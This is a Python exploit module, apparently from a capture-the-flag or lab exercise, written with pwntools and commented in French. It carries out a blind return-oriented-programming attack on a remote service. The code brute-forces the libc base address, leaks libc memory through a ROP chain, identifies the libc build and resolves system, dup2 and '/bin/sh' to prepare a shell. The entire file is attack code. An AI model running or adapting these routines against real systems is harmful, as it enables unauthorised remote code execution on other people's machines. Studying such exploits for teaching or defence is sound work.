#!/usr/bin/python3

from pwn import *
from subprocess import PIPE, Popen
import sys


# SYNTAX COLOURS AND SYSTEM DATA:

CRED = '\x1b[1;31;1m'
CVER = '\x1b[1;32;1m'
CJAU = '\x1b[1;33;1m'
CPUR = '\x1b[1;35;1m'
CEND = '\x1b[0m'

DODO		= 0.03


##### LIBCBASE #####--------------------------------------------------------------------------------

def getLibcBase(ExploitStructure):

	TMP		= ExploitStructure
	BEGIN	= TMP.beginning()

	LIBCOFFSET	= -0x384000	
	return(p64(u64(TMP.BINBASE) + LIBCOFFSET))
	
	# v v v v v  PARTIE INUTILE UNE FOIS L'ADRESSE DE LA BASE DETERMINEE  v v v v v
	LIBCBASE 	= u64(TMP.BINBASE) - 0x1000
	COUNT		= 0

	BROP7	= p64(u64(TMP.BROPGADGET) + 0x7)
	BROP9	= p64(u64(TMP.BROPGADGET) + 0x9)
	R15		= b'JUNKJUNK'

	LEN		= 0x10	# RDX
	SOCKET	= 0x4	# RDI
	
	for i in range(LIBCBASE, 0, -0x1000):

		COUNT += 1
		r = TMP.remoteConnect()

		#JUNK		= r.recv()		# "Enter your choice"
			
		ROPCHAIN	= BROP7 + p64(i) + R15 + BROP9 + p64(SOCKET) + LEAKADR
		PAYLOAD 	= BEGIN + ROPCHAIN

		print(CPUR + '[-] Tested base address : ' + hex(i) + CEND, end='\r')

		r.send(PAYLOAD)
		sleep(DODO)

		#--------------------
		RESP	= r.recv()

		if b'ELF' in RESP:
			print(CVER + "[+] Libc based found at : {}".format(hex(i)) + CEND)
			print(CVER + "[+] Offset from the binary base address is : {}".format(hex(COUNT * -0x1000)) + CEND)
			print(CJAU + "[!] --> Update getLibcBase() function !" + CEND)
			r.close()
			LIBCBASE = i	# dans le cas d'un binaire non remappe (donc avec
			continue		# des adresses ne commençant pas par 0xf7f___...

		try:
			r.close()
		except:
			pass


####################--------------------------------------------------------------------------------

##### LEAK LIBC #####-------------------------------------------------------------------------------

def leakStuff(ExploitStructure)	:	# Permet de fuiter n'importe quoi ; en gros, sert a faire des tests

	TMP		= ExploitStructure

	BEGIN	= TMP.beginning()
	i		= u64(TMP.LIBCBASE)

	BROP7	= p64(u64(TMP.BROPGADGET) + 0x7)
	BROP9	= p64(u64(TMP.BROPGADGET) + 0x9)
	R15		= b'JUNKJUNK'

	LEN		= 0x10	# RDX
	SOCKET	= 0x4	# RDI
	
	FILE	= open("LEAKEDLIBC", "wb")
	LEN		= 0x1

	print(CJAU + '[:] Leaking first 0x600 bytes of Libc...' + CEND)

	while (i < u64(TMP.LIBCBASE)+0x601):

		r = TMP.remoteConnect()

		JUNK		= r.recv()		# "Enter your choice"
			
		ROPCHAIN	= BROP7 + p64(i) + R15 + BROP9 + p64(SOCKET) + TMP.LEAKADR
		PAYLOAD 	= BEGIN + ROPCHAIN

		r.sendline(PAYLOAD)
		sleep(DODO)

		JUNK	= r.recvline()

		try:
			RESP	= r.recvall()
		except:
			continue

		LEN = len(RESP)
		if len(RESP) == 0:
			RESP	= b'\x00'
			LEN 	= 1

		i += LEN
		print(CPUR + '[-] Offset : ' + hex(i) + CEND, end='\r')
		FILE.write(RESP)
		FILE.flush()

		try:
			r.close()
		except:
			pass

	FILE.close()

#####################-------------------------------------------------------------------------------

##### Symbôles #####--------------------------------------------------------------------------------

def getSymboles(ExploitStructure):

	TMP	 = ExploitStructure
	BASE = u64(TMP.LIBCBASE)

	if not TMP.NOLIBLEAK:
		cmd = 'readelf -n LEAKEDLIBC | grep BUILD_ID -A1'
		try:
			print(CJAU + "[:] Getting BuildID..." + CEND)
			p = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
			stdout, stderr = p.communicate()
			TMP.BUILDID = (stdout.decode("utf-8")).split('tion: ')[1].strip("\x0A")
			print(CVER + "[+] BuildID   :	" + TMP.BUILDID) 

		except IndexError:
			print(CRED + "[!] Can't get BuildID : problem with the leaked libc" + CEND)
			exit(CJAU + "[:] Exploitation interruption..." + CEND)
		except Exception as e:
			print(CRED + "[!] Can't get BuildID ; exception information : " + CEND + str(e))
			exit(CJAU + "[:] Exploitation interruption..." + CEND)

	try:
		LIBC = ELF(pwnlib.libcdb.search_by_build_id(TMP.BUILDID))
	except TypeError:
		print(CRED + "[!] Error with the given BuildID" + CEND)
		exit(CJAU + "[:] Exploitation interruption..." + CEND)

	SYSTEM	= p64(BASE + LIBC.symbols.system)
	DUP2	= p64(BASE + LIBC.symbols.dup2)
	BINSH	= p64(BASE + next(LIBC.search(b'/bin/sh\x00')))

	return SYSTEM, DUP2, BINSH


